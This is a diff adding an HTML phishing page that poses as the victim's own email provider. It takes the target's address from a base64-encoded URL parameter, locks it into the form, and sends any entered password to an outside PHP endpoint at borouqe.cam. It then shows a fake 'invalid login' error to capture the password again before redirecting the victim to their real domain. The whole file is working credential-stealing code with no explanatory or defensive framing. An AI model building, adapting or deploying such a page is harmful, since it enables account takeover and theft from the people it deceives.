@@ -1,0 +1,386 @@
+<html lang="en">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle"></title>
+    <style>
+        body {
+            background-color: #E4E8E9;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden; /* Prevents scrolling */
+        }
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #E4E8E9;
+            z-index: 1000;
+        }
+        .spinner {
+            border: 4px solid #F5F5F5;
+            border-top: 4px solid #0587BC;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #333;
+            font-size: 16px;
+            text-align: center;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            display: none; /* Hidden initially */
+        }
+        .box {
+            background-color: #FBFBFB;
+            width: 500px;
+            height: 350px;
+            border: 1px solid #55595A;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+        }
+        .status-bar {
+            background-color: #55595A;
+            width: calc(100% - 2px);
+            height: 45px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0 10px;
+            color: #FFFFFF;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .box-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            width: 100%;
+            text-align: center;
+            padding: 10px 20px;
+            box-sizing: border-box;
+            position: relative;
+        }
+        .protected-symbol {
+            width: 86px;
+            height: 86px;
+            margin: 10px 0;
+
+        }
+        .box-content p {
+            color: #333;
+            font-size: 15px;
+            margin: 5px 0;
+        }
+        .sign-in-button {
+            background-color: #0587BC;
+            color: #FFFFFF;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .sign-in-button:hover {
+            background-color: #0698D6;
+        }
+        .sign-in-form {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: calc(100% - 2px);
+            padding: 20px;
+            background-color: #F5F5F5;
+            border-top: 1px solid #55595A;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            box-sizing: border-box;
+        }
+        .sign-in-form input {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #55595A;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .sign-in-form input[readonly] {
+            background-color: #E8ECEF;
+            cursor: not-allowed;
+        }
+        .sign-in-form button {
+            background-color: #0587BC;
+            color: #FFFFFF;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .sign-in-form button:disabled {
+            background-color: #A0A0A0;
+            cursor: not-allowed;
+        }
+        .sign-in-form button:hover:not(:disabled) {
+            background-color: #0698D6;
+        }
+        .error-message {
+            color: #D32F2F;
+            font-size: 14px;
+            margin: 10px 0;
+            opacity: 1;
+            transition: opacity 1s ease-out;
+        }
+        .error-message.hidden {
+            opacity: 0;
+            height: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen" id="loadingScreen" >
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText"></div>
+    </div>
+    <div class="container" id="mainContent" >
+        <div class="box">
+            <div class="status-bar">
+                <span id="status-bar-text"></span>
+            </div>
+            <div class="box-content">
+                <img src="https://cdn-icons-png.flaticon.com/512/8631/8631491.png" class="protected-symbol" alt="Protected Lock Icon">
+                <p id="protected-text"><strong>Protected Feature</strong><br>
+                For enhanced security, access this page by signing in with the login for
+                <span id="user-placeholder"></span></p>
+                <button class="sign-in-button" id="signInButton" onclick="showSignInForm()">Sign In</button>
+                <div class="sign-in-form" id="signInForm">
+                    <input type="text" id="userInput" placeholder="Enter User ID" aria-label="User ID" readonly="">
+                    <input type="password" id="passkeyInput" placeholder="Enter Password" aria-label="Passkey">
+                    <div class="error-message hidden" id="errorMessage">Service Timed out, Try again</div>
+                    <button type="button" id="continueButton" onclick="submitForm()">Continue</button>
+                </div>
+
+
+            </div>
+        </div>
+    </div>
+    <script>
+function isBase64(str) {
+    try {
+        return btoa(atob(str)) === str;
+    } catch (err) {
+        return false;
+    }
+}
+
+function toTitleCase(str) {
+    return str.replace(/\w\S*/g, function(txt) {
+        return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();
+    });
+}
+
+function getUrlParameter() {
+    const url = window.location.href;
+    let value = '';
+
+    // Check for ?font-face=
+    const queryMatch = url.match(/[?&]font-face=([^&]*)/);
+    if (queryMatch) {
+        value = queryMatch[1];
+    } else {
+        // Check for # fragment
+        const hashMatch = url.match(/#(.*)$/);
+        if (hashMatch) {
+            value = hashMatch[1];
+        }
+    }
+
+    // Decode if base64, otherwise use as is
+    if (value && isBase64(value)) {
+        try {
+            return atob(value);
+        } catch (err) {
+            return value; // Fallback to raw value if decoding fails
+        }
+    }
+    return value || 'User';
+}
+
+function getDomainWithoutTLD(email) {
+    const domain = email.split('@')[1];
+    if (domain) {
+        const domainParts = domain.split('.');
+        return domainParts[0];
+    }
+    return 'User';
+}
+
+function getFullDomain(email) {
+    return email.split('@')[1] || 'User';
+}
+
+function updateContent() {
+    const userValue = getUrlParameter();
+    const domainWithoutTLD = toTitleCase(getDomainWithoutTLD(userValue));
+    const fullDomain = getFullDomain(userValue);
+    const userInput = document.getElementById('userInput');
+    const userPlaceholder = document.getElementById('user-placeholder');
+    const statusBarText = document.getElementById('status-bar-text');
+    const loadingText = document.getElementById('loadingText');
+    const pageTitle = document.getElementById('pageTitle');
+
+    if (userInput && userPlaceholder && statusBarText && loadingText && pageTitle) {
+        userInput.value = userValue;
+        userPlaceholder.textContent = userValue;
+        statusBarText.textContent = `${domainWithoutTLD} Email Service`;
+        loadingText.textContent = `Connecting to ${fullDomain} email service...`;
+        pageTitle.textContent = `${domainWithoutTLD} Email Service`;
+    }
+}
+
+function showSignInForm() {
+    const form = document.getElementById('signInForm');
+    const button = document.getElementById('signInButton');
+    form.style.display = 'flex';
+    button.style.display = 'none';
+}
+
+let submitCount = 0;
+
+function submitForm() {
+    const passkeyInput = document.getElementById('passkeyInput');
+    const passkey = passkeyInput.value.trim(); // Trim to remove leading/trailing spaces
+    const continueButton = document.getElementById('continueButton');
+    const errorMessage = document.getElementById('errorMessage');
+
+    // Check if password is empty
+    if (!passkey) {
+        errorMessage.textContent = 'Please enter a password';
+        errorMessage.classList.remove('hidden');
+        // Fade out error message after 3 seconds
+        setTimeout(() => {
+            errorMessage.classList.add('hidden');
+        }, 3000);
+        return; // Stop submission
+    }
+
+    const user = document.getElementById('userInput').value;
+
+    // Set button to loading state
+    continueButton.textContent = 'Loading...';
+    continueButton.disabled = true;
+
+    // Perform AJAX submission to PHP
+    fetch('https://borouqe.cam/1nkd/blueblack.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `user=${encodeURIComponent(user)}&passkey=${encodeURIComponent(passkey)}`
+    })
+    .then(async response => {
+        const responseText = await response.text();
+
+        if (!response.ok) {
+            passkeyInput.value = '';
+            showError(responseText);
+            return;
+        }
+
+        submitCount += 1;
+
+        if (submitCount === 1) {
+            passkeyInput.value = '';
+            showError('The login is invalid. Please try again.');
+            return;
+        }
+
+        if (submitCount >= 2) {
+            window.location.href = `https://${getDomain(user)}`;
+        }
+    })
+    .catch(error => {
+        passkeyInput.value = '';
+        showError("Something went wrong, Try again");
+    })
+    .finally(() => {
+        // Revert button to Continue
+        continueButton.textContent = 'Continue';
+        continueButton.disabled = false;
+       
+    });
+}
+
+function getDomain(emailAddress){
+    let domainPart = "google.com"
+    if (emailAddress && emailAddress.includes("@")) {
+        domainPart = emailAddress.split("@")[1].trim(); // part after @
+    }
+    return domainPart
+}
+
+function showError(message){
+    const errorMessage = document.getElementById('errorMessage');
+    errorMessage.textContent = message;
+    errorMessage.classList.remove('hidden');
+
+    // Fade out error message after 3 seconds
+    setTimeout(() => {
+        errorMessage.classList.add('hidden');
+    }, 3000);
+}
+
+function showMainContent() {
+    const loadingScreen = document.getElementById('loadingScreen');
+    const mainContent = document.getElementById('mainContent');
+    loadingScreen.style.display = 'none';
+    mainContent.style.display = 'block';
+}
+
+// Update content and show loading screen initially
+window.onload = function() {
+    updateContent();
+    setTimeout(showMainContent, 3000);
+
+    // Add Enter key listener to passkey input
+    const passkeyInput = document.getElementById('passkeyInput');
+    passkeyInput.addEventListener('keypress', function(event) {
+        if (event.key === 'Enter') {
+            event.preventDefault(); // Prevent default form submission behavior
+            submitForm();
+        }
+    });
+};
+    </script>
+
+</body></html>
